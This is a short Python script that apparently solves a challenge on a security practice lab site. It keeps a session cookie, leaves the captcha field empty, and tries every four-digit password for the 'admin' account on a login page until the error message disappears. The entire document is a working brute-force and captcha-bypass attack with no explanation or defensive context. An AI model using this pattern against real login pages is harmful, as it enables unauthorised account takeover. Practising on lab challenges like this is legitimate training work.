#-*- coding:utf-8 -*-
import requests
s = requests.Session()
payload = {
    'Cookie' : 'PHPSESSID=81997a6ae1920b6e4f8f2950e5618074',
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
}
url = 'http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'
for p in range(1000,10000):
    data = {
        'username':'admin',
        'pwd':p,
        'vcode':''
    }
    r = s.post(url,data=data,headers = payload)
    if 'error' in r.text:
        print(str(p) + 'wrong')
    else:
        print(str(p) + 'right')
        break